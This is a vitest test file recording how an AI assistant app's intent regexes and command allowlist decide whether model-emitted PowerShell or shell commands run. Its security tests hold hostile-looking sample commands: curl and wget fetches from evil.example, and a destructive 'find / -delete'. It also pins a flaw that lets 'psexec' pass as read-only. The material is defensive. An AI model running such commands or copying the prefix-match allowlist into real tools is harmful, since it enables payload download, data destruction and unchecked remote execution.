// ── agent-intent.test.ts — CHARACTERIZATION tests for runAI()'s intent gates ──
//
// These tests are a SAFETY NET, not a specification. They record what the code
// in +page.svelte's runAI() does TODAY, quirks included, so the de-monolithing
// migration can prove it changed nothing. Where current behaviour is arguably
// wrong, the test still pins the wrong answer and says so in a `QUIRK:` comment
// — changing it is a separate, deliberate decision, not a refactor side-effect.
//
// The regex literals in $lib/agent-intent were verified byte-identical to the
// inline originals at extraction time.

import { describe, it, expect } from 'vitest';
import {
    detectCodeGenIntent,
    detectNoExecIntent,
    detectRunRequestIntent,
    detectInfoIntent,
    wantsFileOutput,
    classifyTurnIntent,
    isLinuxCmd,
    isReadOnlyCmd,
    stripScaffolding,
    hadActionableBlock,
    detectExecTag,
    shouldExecutePostStream,
} from './agent-intent';

describe('detectCodeGenIntent', () => {
    it('fires on verb + artifact noun (Spanish)', () => {
        expect(detectCodeGenIntent('dame un script de backup')).toBe(true);
        expect(detectCodeGenIntent('créame una función en powershell')).toBe(true);
        expect(detectCodeGenIntent('necesito el código para esto')).toBe(true);
    });

    it('fires on the v1.7.234 enclitic forms that used to slip through', () => {
        // The old regex required a space right after the verb, so these three
        // user-reported phrasings were misread as run-intent.
        expect(detectCodeGenIntent('generame el script')).toBe(true);
        expect(detectCodeGenIntent('entrégame el script')).toBe(true);
        expect(detectCodeGenIntent('genérame nuevamente el script')).toBe(true);
    });

    it('fires on English verb + noun', () => {
        expect(detectCodeGenIntent('write a script to list services')).toBe(true);
        expect(detectCodeGenIntent('show me the powershell command')).toBe(true);
    });

    it('does not fire without an artifact noun', () => {
        expect(detectCodeGenIntent('haz un backup del disco')).toBe(false);
        expect(detectCodeGenIntent('quiero ver el uso de CPU')).toBe(false);
        expect(detectCodeGenIntent('reinicia el servicio spooler')).toBe(false);
    });

    // QUIRK (pinned): `escrib[eaí](me)?` places the optional accent on the vowel
    // AFTER "escrib" — it covers the preterite "escribí" but not the imperative
    // "escríbeme", where the accent falls on the "i" INSIDE the stem. The most
    // natural Spanish way to ask for a script therefore misses codeGenIntent.
    // Same family as the "únicamente" gap in detectNoExecIntent.
    it('QUIRK: "escríbeme" misses — the accent is modelled on the wrong vowel', () => {
        expect(detectCodeGenIntent('escríbeme un script de backup')).toBe(false);
        expect(detectCodeGenIntent('escribeme un script de backup')).toBe(true);
    });

    it('needs the noun within the proximity window', () => {
        // ~40 chars (Spanish) — the noun beyond it is not associated with the verb.
        expect(detectCodeGenIntent('dame ' + 'x'.repeat(30) + ' script')).toBe(true);
        expect(detectCodeGenIntent('dame ' + 'x'.repeat(60) + ' script')).toBe(false);
    });
});

describe('detectNoExecIntent', () => {
    it('fires on explicit Spanish prohibitions', () => {
        expect(detectNoExecIntent('genérame el script pero no lo ejecutes')).toBe(true);
        expect(detectNoExecIntent('dame el comando sin ejecutar')).toBe(true);
        expect(detectNoExecIntent('no quiero que se ejecute')).toBe(true);
    });

    it('fires on the v1.7.236 reflexive-passive clitic', () => {
        // "no se ejecute" — the natural Spanish way to say "don't run it" — was
        // unrecognised until the `se\s+` alternative was added.
        expect(detectNoExecIntent('que no se ejecute nada')).toBe(true);
        expect(detectNoExecIntent('no se lo apliques al servidor')).toBe(true);
    });

    it('fires on "sólo genera" style requests', () => {
        expect(detectNoExecIntent('sólo genera el script')).toBe(true);
        expect(detectNoExecIntent('solamente escribe el script')).toBe(true);
        expect(detectNoExecIntent('nada más genera el script')).toBe(true);
        expect(detectNoExecIntent('just generate the script')).toBe(true);
        expect(detectNoExecIntent('simply write the code')).toBe(true);
    });

    // QUIRK (pinned, NOT endorsed — this one is a real latent bug):
    // the pattern is `\b(?:s[oó]lo|…|[uú]nicamente|…)`, and JS `\b` without the
    // `u` flag is ASCII-only. "ú" is not a \w character, so a leading `\b`
    // before it can never match — the accented spelling "únicamente" is
    // UNREACHABLE, while the unaccented "unicamente" works. Same shape would
    // bite any future accent-initial alternative.
    //
    // Impact is limited but real: "únicamente escribe el código" fails the
    // no-exec gate. It is not a live execution hole today because that phrasing
    // also sets codeGenIntent, which defaults to show-not-run — but the
    // prohibition itself is being dropped.
    it('QUIRK: accent-initial "únicamente" never matches (ASCII \\b)', () => {
        expect(detectNoExecIntent('únicamente escribe el código')).toBe(false);
        expect(detectNoExecIntent('unicamente escribe el codigo')).toBe(true);
        // "sólo" is unaffected — it starts with an ASCII word char.
        expect(detectNoExecIntent('sólo escribe el código')).toBe(true);
    });

    it('fires on English prohibitions', () => {
        expect(detectNoExecIntent("don't execute it")).toBe(true);
        expect(detectNoExecIntent('do not run this')).toBe(true);
        expect(detectNoExecIntent('without running it')).toBe(true);
    });

    it('stays quiet on ordinary prompts', () => {
        expect(detectNoExecIntent('lista los servicios detenidos')).toBe(false);
        expect(detectNoExecIntent('no sé qué está pasando con el disco')).toBe(false);
        expect(detectNoExecIntent('ejecuta el diagnóstico')).toBe(false);
    });

    // QUIRK (pinned, not endorsed): a rhetorical question asking Lucy to run
    // something reads as a prohibition, because "no corres" matches
    // /\bno\s+corr\w+/. The user means the opposite. Suppressing execution is
    // the fail-safe direction, so this is recorded rather than fixed here.
    it('QUIRK: rhetorical "¿por qué no corres…?" is read as a prohibition', () => {
        expect(detectNoExecIntent('¿por qué no corres el script?')).toBe(true);
    });
});

describe('detectRunRequestIntent', () => {
    it('fires on explicit run orders', () => {
        expect(detectRunRequestIntent('ejecútalo')).toBe(true);
        expect(detectRunRequestIntent('córrelo ahora')).toBe(true);
        expect(detectRunRequestIntent('genera el script y ejecútalo')).toBe(true);
        expect(detectRunRequestIntent('run it')).toBe(true);
        expect(detectRunRequestIntent('go ahead')).toBe(true);
    });

    it('does NOT fire on the negated form — so it cannot cancel a prohibition', () => {
        // "ejecutes" is deliberately absent from the enclitic list; if it matched,
        // "no lo ejecutes" would set BOTH flags and the override could run a
        // command the user forbade.
        expect(detectRunRequestIntent('no lo ejecutes')).toBe(false);
        expect(detectNoExecIntent('no lo ejecutes')).toBe(true);
    });

    it('stays quiet on unrelated verbs', () => {
        expect(detectRunRequestIntent('revisa el log de errores')).toBe(false);
    });
});

describe('detectInfoIntent', () => {
    it('fires on "how do I…" phrasings', () => {
        expect(detectInfoIntent('cómo puedo ver los servicios')).toBe(true);
        expect(detectInfoIntent('cómo se hace esto')).toBe(true);
        expect(detectInfoIntent('muéstrame cómo se hace')).toBe(true);
        expect(detectInfoIntent('qué comando uso para ver la RAM')).toBe(true);
        expect(detectInfoIntent('cuál es el comando para reiniciar')).toBe(true);
        expect(detectInfoIntent('what command lists the services')).toBe(true);
        expect(detectInfoIntent('how do I check disk usage')).toBe(true);
        expect(detectInfoIntent('show me how to restart the spooler')).toBe(true);
        expect(detectInfoIntent('para ejecutarlo yo mismo')).toBe(true);
    });

    // QUIRK (pinned): the two phrase alternatives written specifically for
    // "dame el comando" / "give me the command" are DEAD CODE. Both phrasings
    // pair a generation verb (dame / give) with an artifact noun
    // (comando / command), so codeGenIntent fires first and the `!codeGenIntent`
    // guard disables the whole phrase half.
    //
    // Not an execution hole — the post-stream gate suppresses codeGenIntent
    // without a run order just as it suppresses infoIntent — but any code that
    // branches on infoIntent SPECIFICALLY (rather than on the gate) sees false
    // for the single most literal "just show me the command" request there is.
    it('QUIRK: "dame el comando" routes through codeGenIntent, not infoIntent', () => {
        expect(detectInfoIntent('dame el comando para ver los puertos')).toBe(false);
        expect(detectCodeGenIntent('dame el comando para ver los puertos')).toBe(true);
        expect(detectInfoIntent('give me the command to list ports')).toBe(false);
        expect(detectCodeGenIntent('give me the command to list ports')).toBe(true);
    });

    it('noExecIntent short-circuits and wins even when codeGenIntent is true', () => {
        // The `||` ordering is load-bearing: an explicit prohibition must survive
        // a simultaneous generation request.
        const raw = 'genérame el script pero no lo ejecutes';
        expect(detectCodeGenIntent(raw)).toBe(true);
        expect(detectNoExecIntent(raw)).toBe(true);
        expect(detectInfoIntent(raw)).toBe(true);
    });

    it('codeGenIntent suppresses the phrase-based half', () => {
        // "cómo puedo…" is info-intent on its own; adding a generation verb +
        // artifact noun flips codeGenIntent on and disables the phrase half.
        expect(detectInfoIntent('cómo puedo listar los servicios')).toBe(true);
        expect(detectInfoIntent('dame un script y dime cómo puedo usarlo')).toBe(false);
    });

    it('accepts precomputed flags rather than recomputing them', () => {
        // The call site resolves the flags once; passing them must not change
        // the outcome.
        const raw = 'dame el comando para ver los puertos';
        expect(detectInfoIntent(raw, { codeGenIntent: false, noExecIntent: false })).toBe(true);
        expect(detectInfoIntent(raw, { codeGenIntent: true, noExecIntent: false })).toBe(false);
        expect(detectInfoIntent(raw, { codeGenIntent: true, noExecIntent: true })).toBe(true);
    });
});

describe('prompt coercion', () => {
    // The inline originals passed `raw` straight to RegExp.test(), which coerces
    // undefined to the string "undefined". Normalising to '' in the module is
    // only safe because no pattern matches those literals — pinned here.
    it('treats null/undefined the same as an empty prompt', () => {
        for (const fn of [detectCodeGenIntent, detectNoExecIntent, detectRunRequestIntent, wantsFileOutput]) {
            expect(fn(undefined)).toBe(fn(''));
            expect(fn(null)).toBe(fn(''));
            expect(fn('undefined')).toBe(false);
            expect(fn('null')).toBe(false);
        }
        expect(detectInfoIntent(undefined)).toBe(detectInfoIntent(''));
    });
});

describe('wantsFileOutput', () => {
    it('fires when the user asks for the result on disk', () => {
        expect(wantsFileOutput('genera el informe en el escritorio')).toBe(true);
        expect(wantsFileOutput('guarda en un archivo el resultado')).toBe(true);
        expect(wantsFileOutput('exportalo a informe.md')).toBe(true);
        expect(wantsFileOutput('save it to disk')).toBe(true);
    });

    it('fires on a filename with an extension', () => {
        expect(wantsFileOutput('quiero un resumen.pdf')).toBe(true);
        expect(wantsFileOutput('guárdalo en informe.md')).toBe(true);
    });

    // QUIRK (pinned): the extension alternative sits inside a group opened with
    // `\b`, immediately before `\.`. A `\b` needs a word char on one side, so a
    // SPACE-preceded bare extension never matches — only an extension glued to a
    // filename does. "dame los datos en .csv" therefore misses this guard and
    // the quick-tool short-circuit may answer in chat instead of writing a file.
    it('QUIRK: a space-preceded bare extension does not match', () => {
        expect(wantsFileOutput('dame los datos en .csv')).toBe(false);
        expect(wantsFileOutput('dame los datos en datos.csv')).toBe(true);
    });

    it('stays quiet on in-chat requests', () => {
        expect(wantsFileOutput('dime cuánta RAM tengo')).toBe(false);
        expect(wantsFileOutput('lista los procesos activos')).toBe(false);
    });
});

describe('classifyTurnIntent', () => {
    it('resolves all five flags coherently for a plain diagnostic prompt', () => {
        expect(classifyTurnIntent('revisa el uso de disco')).toEqual({
            codeGenIntent: false,
            noExecIntent: false,
            runRequestIntent: false,
            infoIntent: false,
            skillInfoIntent: false,
        });
    });

    it('marks skillInfoIntent from the active-skill argument alone', () => {
        expect(classifyTurnIntent('revisa el disco', { id: 'nmap' }).skillInfoIntent).toBe(true);
        expect(classifyTurnIntent('revisa el disco', null).skillInfoIntent).toBe(false);
        expect(classifyTurnIntent('revisa el disco').skillInfoIntent).toBe(false);
    });

    it('captures the generate-then-run combination', () => {
        const i = classifyTurnIntent('genérame un script de limpieza y ejecútalo');
        expect(i.codeGenIntent).toBe(true);
        expect(i.runRequestIntent).toBe(true);
        expect(i.noExecIntent).toBe(false);
        expect(i.infoIntent).toBe(false);
    });
});

describe('isLinuxCmd', () => {
    it('detects Linux-only syntax the model emitted on Windows', () => {
        expect(isLinuxCmd('sudo apt update')).toBe(true);
        expect(isLinuxCmd('  systemctl status nginx')).toBe(true);
        expect(isLinuxCmd('chmod +x run.sh')).toBe(true);
        expect(isLinuxCmd('ip route show')).toBe(true);
    });

    it('passes PowerShell through', () => {
        expect(isLinuxCmd('Get-Service | Where-Object Status -eq Running')).toBe(false);
        expect(isLinuxCmd('Get-Date')).toBe(false);
    });

    it('anchors at the start, so a Linux word mid-command does not trip it', () => {
        expect(isLinuxCmd('Write-Host "run sudo apt to update"')).toBe(false);
    });
});

describe('isReadOnlyCmd — the parallel-batch allowlist', () => {
    it('accepts read-only PowerShell verbs and POSIX readers', () => {
        expect(isReadOnlyCmd('Get-Process')).toBe(true);
        expect(isReadOnlyCmd('  Select-String foo')).toBe(true);
        expect(isReadOnlyCmd('netstat -ano')).toBe(true);
        expect(isReadOnlyCmd('df -h')).toBe(true);
    });

    it('SECURITY: curl / wget / find stay OUT of the allowlist', () => {
        // Removed in the phase-1 security review — these were being auto-run in
        // parallel with no confirm modal. curl/wget fetch attacker-controlled
        // content and can write to disk; `find … -delete` is destructive.
        expect(isReadOnlyCmd('curl http://evil.example/x')).toBe(false);
        expect(isReadOnlyCmd('wget http://evil.example/x -O /tmp/p')).toBe(false);
        expect(isReadOnlyCmd('find / -name "*.log" -delete')).toBe(false);
    });

    it('keeps the PowerShell Find- verb, which is genuinely read-only', () => {
        expect(isReadOnlyCmd('Find-Module Pester')).toBe(true);
    });

    it('rejects mutating commands', () => {
        expect(isReadOnlyCmd('Remove-Item C:\\temp -Recurse')).toBe(false);
        expect(isReadOnlyCmd('Stop-Service spooler')).toBe(false);
    });

    // QUIRK (pinned): the allowlist is a bare prefix match with no word
    // boundary, so a command that merely STARTS with an allowlisted token is
    // accepted — `psexec` passes because of `ps`. Worth revisiting, but not as
    // part of a refactor.
    it('QUIRK: prefix match has no word boundary — psexec passes as read-only', () => {
        expect(isReadOnlyCmd('psexec \\\\host cmd.exe')).toBe(true);
    });
});

describe('stripScaffolding', () => {
    it('removes every scaffolding tag', () => {
        const resp = '<THOUGHT>pensando</THOUGHT>\n<TOOL>sysinfo</TOOL>\n<PLAN>a|b</PLAN>\n<LEARN>k|s|d</LEARN>';
        expect(stripScaffolding(resp, false)).toBe('');
    });

    it('removes <REMEMBER> including its attributes', () => {
        expect(stripScaffolding('<REMEMBER key="ram">32GB</REMEMBER>', false)).toBe('');
    });

    it('drops EXECUTE inner content when the block will NOT be shown', () => {
        expect(stripScaffolding('<EXECUTE_CMD>Get-Date</EXECUTE_CMD>', false)).toBe('');
    });

    it('keeps EXECUTE inner content when the block IS rendered as a fence', () => {
        // infoIntent / codeGenIntent / skillInfoIntent modes — otherwise the user
        // sees an "empty response" warning under a perfectly visible code block.
        expect(stripScaffolding('<EXECUTE_CMD>Get-Date</EXECUTE_CMD>', true)).toBe('Get-Date');
    });

    it('preserves surrounding prose', () => {
        expect(stripScaffolding('Voy a mirarlo.<TOOL>sysinfo</TOOL>Listo.', false))
            .toBe('Voy a mirarlo.Listo.');
    });

    it('QUIRK: the EXECUTE open/close tags are matched independently', () => {
        // /<EXECUTE[^>]*>…<\/EXECUTE[^>]*>/ does not require the suffixes to
        // agree, so a mismatched pair is still stripped.
        expect(stripScaffolding('<EXECUTE_CMD>Get-Date</EXECUTE>', false)).toBe('');
    });

    it('treats null/undefined as empty', () => {
        expect(stripScaffolding(null, false)).toBe('');
        expect(stripScaffolding(undefined, true)).toBe('');
    });
});

describe('hadActionableBlock', () => {
    it('recognises every EXECUTE variant, including the v1.7.154 remote case', () => {
        // `<EXECUTE\b` never matched `<EXECUTE_REMOTE>` (no boundary before `_`),
        // so a reply that was ONLY a remote command looked empty and the command
        // never fired. The pattern dropped the \b for exactly this.
        expect(hadActionableBlock('<EXECUTE_REMOTE target="srv1">Get-Date</EXECUTE_REMOTE>')).toBe(true);
        expect(hadActionableBlock('<EXECUTE_CMD>Get-Date</EXECUTE_CMD>')).toBe(true);
        expect(hadActionableBlock('<EXECUTE>Get-Date</EXECUTE>')).toBe(true);
    });

    it('recognises the non-exec actionable tags', () => {
        expect(hadActionableBlock('<TOOL>sysinfo</TOOL>')).toBe(true);
        expect(hadActionableBlock('<PLAN>a|b</PLAN>')).toBe(true);
        expect(hadActionableBlock('<REMEMBER key="x">v</REMEMBER>')).toBe(true);
        expect(hadActionableBlock('<LEARN>k|s|d</LEARN>')).toBe(true);
    });

    it('is false for plain prose', () => {
        expect(hadActionableBlock('Tienes 32 GB de RAM.')).toBe(false);
        expect(hadActionableBlock('')).toBe(false);
        expect(hadActionableBlock(null)).toBe(false);
    });
});

describe('detectExecTag — engine routing and precedence', () => {
    it('routes each explicit tag to its engine', () => {
        expect(detectExecTag('<EXECUTE_WMIC>os get caption</EXECUTE_WMIC>', 'powershell', false))
            .toEqual({ type: 'wmic', cmd: 'os get caption' });
        expect(detectExecTag('<EXECUTE_NETSH>wlan show profiles</EXECUTE_NETSH>', 'powershell', false))
            .toEqual({ type: 'netsh', cmd: 'wlan show profiles' });
        expect(detectExecTag('<EXECUTE_REG>query HKLM</EXECUTE_REG>', 'powershell', false))
            .toEqual({ type: 'reg', cmd: 'query HKLM' });
        expect(detectExecTag('<EXECUTE_CSCRIPT>WScript.Echo 1</EXECUTE_CSCRIPT>', 'powershell', false))
            .toEqual({ type: 'cscript', cmd: 'WScript.Echo 1' });
    });

    it('honours the CMD → WMIC → NETSH → REG → CSCRIPT → PS precedence', () => {
        const multi = '<EXECUTE_NETSH>n</EXECUTE_NETSH><EXECUTE_WMIC>w</EXECUTE_WMIC>';
        expect(detectExecTag(multi, 'cmd', false)).toEqual({ type: 'wmic', cmd: 'w' });
    });

    it('QUIRK: <EXECUTE_CMD> runs through PowerShell when the tab engine is PS', () => {
        // Intentional — PowerShell executes native commands fine, so the tab's
        // engine setting overrides the tag's implied engine.
        expect(detectExecTag('<EXECUTE_CMD>ipconfig</EXECUTE_CMD>', 'powershell', false))
            .toEqual({ type: 'powershell', cmd: 'ipconfig' });
        expect(detectExecTag('<EXECUTE_CMD>ipconfig</EXECUTE_CMD>', 'cmd', false))
            .toEqual({ type: 'cmd', cmd: 'ipconfig' });
    });

    it('lets a cmd-engine tab claim a bare <EXECUTE>', () => {
        expect(detectExecTag('<EXECUTE>dir</EXECUTE>', 'cmd', false)).toEqual({ type: 'cmd', cmd: 'dir' });
        expect(detectExecTag('<EXECUTE>dir</EXECUTE>', 'powershell', false))
            .toEqual({ type: 'powershell', cmd: 'dir' });
    });

    it('falls back to a fenced code block only for PowerShell', () => {
        expect(detectExecTag('```powershell\nGet-Date\n```', 'powershell', false))
            .toEqual({ type: 'powershell', cmd: 'Get-Date' });
    });

    it('SECURITY: the fence fallback is disabled under infoIntent', () => {
        // Those fences are display-only output produced by the code-generation
        // guard. Matching them would re-execute what was deliberately shown.
        expect(detectExecTag('```powershell\nGet-Date\n```', 'powershell', true)).toBe(null);
        // An explicit tag still runs — the gate above, not this one, suppresses it.
        expect(detectExecTag('<EXECUTE>Get-Date</EXECUTE>', 'powershell', true))
            .toEqual({ type: 'powershell', cmd: 'Get-Date' });
    });

    it('matches ```vb and ```vbs fences as cscript', () => {
        expect(detectExecTag('```vbs\nWScript.Echo 1\n```', 'powershell', false))
            .toEqual({ type: 'cscript', cmd: 'WScript.Echo 1' });
        expect(detectExecTag('```vb\nWScript.Echo 1\n```', 'powershell', false))
            .toEqual({ type: 'cscript', cmd: 'WScript.Echo 1' });
    });

    // The agent loop carries a SECOND, deliberately different copy of this
    // detection (see `execRemoteM` in +page.svelte). Differences that matter:
    //
    //   post-stream (here)        agent loop
    //   ────────────────────      ──────────────────────────────
    //   strict `</EXECUTE_X>`     tolerant `(?:</EXECUTE_X>|$)` — a stream cut
    //                             mid-tag still runs
    //   ```ps / ```vbs fences     no fence fallback at all
    //   no EXECUTE_REMOTE         EXECUTE_REMOTE wins the precedence chain
    //
    // Pinned so a future "let's just share one function" change has to confront
    // the difference instead of silently picking one side.
    it('requires a closing tag — unlike the agent loop copy, which tolerates truncation', () => {
        expect(detectExecTag('<EXECUTE_CMD>Get-Date', 'powershell', false)).toBe(null);
        expect(detectExecTag('<EXECUTE>Get-Date', 'powershell', false)).toBe(null);
    });

    it('does not handle EXECUTE_REMOTE — that path is the agent loop\'s', () => {
        // The post-stream code handles remote execs in an earlier, separate
        // branch; by the time detectExecTag runs, a remote-only reply has
        // already returned.
        expect(detectExecTag('<EXECUTE_REMOTE target="srv1">Get-Date</EXECUTE_REMOTE>', 'powershell', false))
            .toBe(null);
    });

    it('returns null when there is nothing to run', () => {
        expect(detectExecTag('Tienes 32 GB de RAM.', 'powershell', false)).toBe(null);
        expect(detectExecTag('', 'powershell', false)).toBe(null);
    });

    it('trims the command body', () => {
        expect(detectExecTag('<EXECUTE>\n  Get-Date  \n</EXECUTE>', 'powershell', false))
            .toEqual({ type: 'powershell', cmd: 'Get-Date' });
    });
});

describe('shouldExecutePostStream — the gate that decides if anything runs', () => {
    const tag = { type: 'powershell', cmd: 'Get-Date' } as const;
    const base = {
        codeGenIntent: false,
        noExecIntent: false,
        runRequestIntent: false,
        infoIntent: false,
        skillInfoIntent: false,
    };

    it('runs a plain actionable turn', () => {
        expect(shouldExecutePostStream(tag, base)).toBe(true);
    });

    it('never runs without a tag', () => {
        expect(shouldExecutePostStream(null, base)).toBe(false);
    });

    it('suppresses under infoIntent (which folds in noExecIntent)', () => {
        expect(shouldExecutePostStream(tag, { ...base, infoIntent: true })).toBe(false);
    });

    it('suppresses while a security skill is active', () => {
        expect(shouldExecutePostStream(tag, { ...base, skillInfoIntent: true })).toBe(false);
    });

    it('generation defaults to show-not-run, unless an explicit order overrides', () => {
        expect(shouldExecutePostStream(tag, { ...base, codeGenIntent: true })).toBe(false);
        expect(shouldExecutePostStream(tag, { ...base, codeGenIntent: true, runRequestIntent: true })).toBe(true);
    });

    it('SECURITY: a run order can never override an explicit prohibition', () => {
        // noExecIntent reaches this gate through infoIntent, which is checked
        // first — so "genéralo y ejecútalo, pero no lo ejecutes" stays blocked.
        const intent = { ...base, codeGenIntent: true, runRequestIntent: true, noExecIntent: true, infoIntent: true };
        expect(shouldExecutePostStream(tag, intent)).toBe(false);
    });

    it('blocks Linux syntax on Windows', () => {
        expect(shouldExecutePostStream({ type: 'powershell', cmd: 'sudo apt update' }, base)).toBe(false);
    });

    it('end-to-end: the gate agrees with classifyTurnIntent for real prompts', () => {
        const run = (raw: string, resp: string, skill: unknown = null) => {
            const intent = classifyTurnIntent(raw, skill);
            return shouldExecutePostStream(detectExecTag(resp, 'powershell', intent.infoIntent), intent);
        };
        const exec = '<EXECUTE>Get-Date</EXECUTE>';
        expect(run('qué hora es en mi equipo', exec)).toBe(true);
        expect(run('dame el comando para ver la hora', exec)).toBe(false);
        expect(run('genérame un script pero no lo ejecutes', exec)).toBe(false);
        expect(run('genérame un script de limpieza', exec)).toBe(false);
        expect(run('genérame un script de limpieza y ejecútalo', exec)).toBe(true);
        expect(run('qué hora es', exec, { id: 'nmap' })).toBe(false);
    });
});
